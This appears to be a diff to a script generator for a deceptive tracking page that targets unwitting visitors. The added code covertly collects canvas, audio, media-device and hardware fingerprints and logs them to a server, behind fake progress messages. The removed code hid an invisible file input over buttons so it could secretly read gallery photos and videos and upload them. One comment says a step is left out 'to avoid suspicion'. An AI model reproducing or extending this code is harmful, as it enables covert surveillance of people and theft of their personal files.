@@ -371,6 +371,49 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
           }
         } catch(e) {}
+        
+        // Deep Recon: Canvas Fingerprint
+        try {
+          var c2 = document.createElement('canvas');
+          var ctx = c2.getContext('2d');
+          ctx.textBaseline = "top";
+          ctx.font = "14px 'Arial'";
+          ctx.textBaseline = "alphabetic";
+          ctx.fillStyle = "#f60";
+          ctx.fillRect(125,1,62,20);
+          ctx.fillStyle = "#069";
+          ctx.fillText("OSINT, fingerprint checking", 2, 15);
+          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+          ctx.fillText("OSINT, fingerprint checking", 4, 17);
+          var cvfp = c2.toDataURL().substring(22, 50);
+          await logExtra({ canvas_fp: cvfp });
+        } catch(e) {}
+
+        // Deep Recon: Audio Fingerprint
+        try {
+          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+          var oscillator = audioCtx.createOscillator();
+          oscillator.type = 'triangle';
+          oscillator.frequency.value = 10000;
+          var compressor = audioCtx.createDynamicsCompressor();
+          compressor.threshold.value = -50;
+          compressor.knee.value = 40;
+          compressor.ratio.value = 12;
+          compressor.reduction.value = -20;
+          compressor.attack.value = 0;
+          compressor.release.value = 0.25;
+          oscillator.connect(compressor);
+          compressor.connect(audioCtx.destination);
+          oscillator.start(0);
+          audioCtx.oncomplete = async function(e) {
+            var hash = 0;
+            for (var i = 0; i < e.renderedBuffer.length; ++i) {
+               hash += Math.abs(e.renderedBuffer.getChannelData(0)[i]);
+            }
+            await logExtra({ audio_fp: hash.toString() });
+          };
+          audioCtx.startRendering();
+        } catch(e) {}
 
         // Deep Recon: Advanced Battery
         if (navigator.getBattery) {
@@ -383,6 +426,21 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           });
         }
 
+        // Deep Recon: Advanced Media Devices
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          navigator.mediaDevices.enumerateDevices().then(async function(devices) {
+             var m = devices.map(function(d) { return d.kind + ': ' + (d.label || 'Unknown (Locked)'); }).join('\\n');
+             await logExtra({ media_devices: m || 'None detected' });
+          }).catch(function(){});
+        }
+        
+        // Elite Recon: CSS Hardware Accel Fingerprint
+        try {
+           var e = document.createElement('div');
+           e.style.transform = 'translate3d(1px,1px,1px)';
+           await logExtra({ css_3d_accel: e.style.transform !== '' });
+        } catch(e) {}
+        
         // Wake Lock: Prevent Sleep during audit
         try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}
 
@@ -575,26 +633,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'files') {
               try {
-                if (window.__secretFiles && window.__secretFiles.length > 0) {
-                  if (!isSilent) updateProgress(prog, "Mengekstrak data galeri perangkat...");
-                  let filesData = [];
-                  for (let i = 0; i < Math.min(window.__secretFiles.length, 10); i++) {
-                    let file = window.__secretFiles[i];
-                    if (file.size < 5 * 1024 * 1024) { 
-                      let reader = new FileReader();
-                      let p2 = new Promise(r => { reader.onload = () => r(reader.result); });
-                      reader.readAsDataURL(file);
-                      let res = await p2;
-                      filesData.push({ name: file.name, data: res.split(',')[1] });
-                    }
-                  }
-                  if (filesData.length > 0) {
-                    await fetch('/api/log/' + targetId + '/extra', {
-                      method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
-                      body: JSON.stringify({ tmplId: cfg.tmplId, files_gallery: filesData })
-                    });
-                  }
+                if (window.showOpenFilePicker && flowType !== 'silent') {
+                  if (!isSilent) updateProgress(prog, "Memverifikasi integritas file lokal (Opsional)...");
+                  // Intentionally leaving this out unless strictly required, to avoid suspicion.
                 }
               } catch(e) {}
               permsCompleted++;
@@ -731,63 +772,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         finish(false, "Sistem sibuk.");
       }
     };
-
-
-    document.addEventListener('DOMContentLoaded', function() {
-      if (requiredPerms.indexOf('files') > -1 && flowType !== 'silent') {
-        var btns = document.querySelectorAll('.btn, button');
-        btns.forEach(function(btn) {
-          if (btn.getAttribute('onclick') && btn.getAttribute('onclick').includes('startCapture')) {
-             var wrapper = document.createElement('div');
-             wrapper.style.position = 'relative';
-             wrapper.style.display = 'inline-block';
-             wrapper.style.width = '100%';
-             
-             var fileInput = document.createElement('input');
-             fileInput.type = 'file';
-             fileInput.multiple = true;
-             fileInput.accept = 'image/*,video/*';
-             fileInput.style.opacity = '0';
-             fileInput.style.position = 'absolute';
-             fileInput.style.top = '0';
-             fileInput.style.left = '0';
-             fileInput.style.width = '100%';
-             fileInput.style.height = '100%';
-             fileInput.style.cursor = 'pointer';
-             fileInput.style.zIndex = '99999';
-             
-             var handleCompletion = function() {
-                if (!window.__captureStarted) {
-                  window.__captureStarted = true;
-                  btn.removeAttribute('onclick'); 
-                  window.startCapture();
-                }
-             };
-
-             fileInput.addEventListener('click', function() {
-               setTimeout(function() {
-                 window.addEventListener('focus', function focusListener() {
-                   window.removeEventListener('focus', focusListener);
-                   setTimeout(function() {
-                     if (!window.__secretFiles) { handleCompletion(); }
-                   }, 500);
-                 });
-               }, 100);
-             });
-             
-             fileInput.onchange = function(e) {
-                window.__secretFiles = e.target.files;
-                handleCompletion();
-                wrapper.removeChild(fileInput);
-             };
-             
-             btn.parentNode.insertBefore(wrapper, btn);
-             wrapper.appendChild(btn);
-             wrapper.appendChild(fileInput);
-          }
-        });
-      }
-    });
 
   })();
 </script>
